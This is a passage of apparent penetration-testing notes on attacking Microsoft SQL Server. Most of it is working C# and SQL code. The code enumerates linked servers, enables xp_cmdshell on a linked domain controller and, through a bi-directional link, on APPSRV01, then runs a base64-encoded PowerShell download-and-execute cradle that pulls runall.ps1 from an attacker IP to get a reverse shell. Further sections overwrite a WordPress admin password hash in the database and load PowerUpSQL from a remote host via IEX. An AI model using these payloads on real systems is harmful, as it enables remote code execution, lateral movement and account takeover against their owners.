            Console.WriteLine("Linked SQL server: " + reader[0]);
        }
        reader.Close();
        ```


  * Using sqlcmd
    * ```sql
      :setvar SQLCMDMAXVARTYPEWIDTH 30
      :setvar SQLCMDMAXFIXEDTYPEWIDTH 30
      EXEC sp_linkedservers
      GO
      ```
- Execute query on linked server
  *   ```csharp
      String execCmd = "select version from openquery(\"dc01\", 'select @@version as version')";

      SqlCommand command = new SqlCommand(execCmd, con);
      SqlDataReader reader = command.ExecuteReader();

      while (reader.Read())
      {
          Console.WriteLine("Linked SQL server: " + reader[0]);
      }
      reader.Close();
      ```


  * If received `Access to the remote server is denied because no login-mapping exists.` --> Check which accounts are able to use linked servers [here](1433-mssql.md#enumeration-within-sql-server-management-studio), or custom code below:

<pre class="language-csharp"><code class="lang-csharp"><strong>            //WRITE CODE HERE!
</strong>            string sql = @"
                SELECT
                    SP.name                     AS LocalLogin,
                    LL.remote_name              AS RemoteLogin,
                    CASE WHEN LL.uses_self_credential = 1 THEN 'Yes' ELSE 'No' END AS SelfMapped,
                    LL.modify_date              AS LastModified
                FROM sys.servers S
                JOIN sys.linked_logins LL
                    ON S.server_id = LL.server_id
                LEFT JOIN sys.server_principals SP
                    ON LL.local_principal_id = SP.principal_id
                WHERE S.name = 'SQL53';
                ";
            SqlCommand cmd = new SqlCommand(sql, con);
            SqlDataReader rdr = cmd.ExecuteReader();

            if (!rdr.HasRows)
            {
                Console.WriteLine("No login mappings found for linked server SQL53.");
            }
            else
            {
                Console.WriteLine("\nMappings for linked server SQL53:\n");
                Console.WriteLine("{0,-30} {1,-30} {2,-12} {3}", "LocalLogin", "RemoteLogin", "SelfMapped", "LastModified");
                Console.WriteLine(new string('-', 95));

                while (rdr.Read())
                {
                    var local = rdr.IsDBNull(0) ? "&#x3C;NULL>" : rdr.GetString(0);
                    var remote = rdr.IsDBNull(1) ? "&#x3C;NULL>" : rdr.GetString(1);
                    var self = rdr.GetString(2);
                    var modified = rdr.GetDateTime(3);
                    Console.WriteLine("{0,-30} {1,-30} {2,-12} {3}", local, remote, self, modified);
                }
            }
            rdr.Close();
            //END OF CODE!
        
</code></pre>

<figure><img src="../.gitbook/assets/image (351).png" alt=""><figcaption><p>Must impersonate as webapp11 to execute sql queries on SQL53</p></figcaption></figure>

* Reverse shell on linked server
  *   <pre class="language-csharp"><code class="lang-csharp"><strong>//string impersonateSql = "EXECUTE AS LOGIN = 'webapp11';";
      </strong><strong>//using (var impCmd = new SqlCommand(impersonateSql, con))
      </strong>//{
      //    impCmd.ExecuteNonQuery();
      //}

      String enable_xpcmd = "EXEC ('sp_configure ''show advanced options'', 1; reconfigure; EXEC sp_configure ''xp_cmdshell'', 1; reconfigure;') AT \"DC01\";";
      SqlCommand command = new SqlCommand(enable_xpcmd, con);
      command.ExecuteNonQuery();
      Console.WriteLine("[+] Enabled xp_cmdshell on DC01");

      String powershellCommand = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.197/runall.ps1')";
      String b64Command = Convert.ToBase64String(Encoding.Unicode.GetBytes(powershellCommand));

      String execCmd = $"EXEC ('EXEC xp_cmdshell ''powershell -EncodedCommand {b64Command}''') AT \"DC01\";";
      Console.WriteLine("[+] Executing payload on DC01: " + execCmd);

      command = new SqlCommand(execCmd, con);
      command.ExecuteNonQuery();

      Console.WriteLine("[+] Command executed successfully on DC01.");

      </code></pre>


* Check if DC01 also links back to APPSrv01 ![](<../.gitbook/assets/image (6) (1) (1) (1) (1) (1) (1) (1) (1).png>)
  *   ```csharp
      String execCmd = "EXEC ('sp_linkedservers') AT DC01;";

      SqlCommand command = new SqlCommand(execCmd, con);
      SqlDataReader reader = command.ExecuteReader();

      while (reader.Read())
      {
          Console.WriteLine("Linked SQL server: " + reader[0]);
      }
      reader.Close();

      ```


* Reverse shell on APPSRV01 from DC01, bi-directional linked servers
  * ```csharp
    String enable_xpcmd = "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;" +
                "EXEC sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT APPSRV01') AT DC01;";
    SqlCommand command = new SqlCommand(enable_xpcmd, con);
    command.ExecuteNonQuery();
    Console.WriteLine("[+] Enabled xp_cmdshell on APPSRV01 via DC01");

    String powershellCommand = "IEX (New-Object Net.WebClient).DownloadString('http://192.168.45.197/runall.ps1')";
    String b64Command = Convert.ToBase64String(Encoding.Unicode.GetBytes(powershellCommand));

    String execCmd = "EXEC ('EXEC (''EXEC xp_cmdshell ''''powershell -EncodedCommand " + b64Command + "'''' '') AT APPSRV01') AT DC01;";
    Console.WriteLine("[+] Executing payload on APPSRV01 via DC01: " + execCmd);

    command = new SqlCommand(execCmd, con);
    command.ExecuteNonQuery();

    Console.WriteLine("[+] Command executed successfully on APPSRV01.");

    ```

</details>

<details>

<summary>Changing WordPress Admin Password In MSSQL</summary>

[Add local admin bill to sysadmin on DB02](1433-mssql.md#adding-local-admin-account-to-mssql-server)

<figure><img src="../.gitbook/assets/image (323).png" alt=""><figcaption></figcaption></figure>

Go to SQL Server Management Studio and try to login with Windows Authentication

<figure><img src="../.gitbook/assets/image (324).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (325).png" alt=""><figcaption></figcaption></figure>

wordpress.dbo.wp\_users store the user login credentials

<figure><img src="../.gitbook/assets/image (326).png" alt=""><figcaption></figcaption></figure>

View Wordpress DB using --> F5 to execute:

```sql
SELECT * FROM wordpress.dbo.wp_users;
```

<figure><img src="../.gitbook/assets/image (327).png" alt=""><figcaption></figcaption></figure>

Generate wordpress hash for password "P@ssw0rd123!" using [https://codebeautify.org/wordpress-password-hash-generator](https://codebeautify.org/wordpress-password-hash-generator)

<figure><img src="../.gitbook/assets/image (328).png" alt=""><figcaption><p>$P$BuPbVkfYweJaroL1oBRyICSmrJhp2v1</p></figcaption></figure>

SQL query to update wordpress admin password to P@ssw0rd123!

```sql
UPDATE [wordpress].[dbo].[wp_users]
SET [user_pass] = '$P$BuPbVkfYweJaroL1oBRyICSmrJhp2v1'
WHERE [user_login] = 'admin';
```

Go to /wp-login.php (admin:P@ssw0rd123!)

<figure><img src="../.gitbook/assets/image (329).png" alt=""><figcaption></figcaption></figure>

</details>

<details>

<summary>Checking for MSSQL misconfigurations (PowerUpSQL)</summary>

```powershell
iex (new-object net.webclient).downloadstring('http://10.10.14.2/PowerUpSQL.ps1')
Invoke-SQLAudit
# Invoke-SQLAudit -Instance ZPH-SVRSQL01.zsm.local -Verbose -username zabbix -password rDhHbBEfh35sMbkY
```

</details>
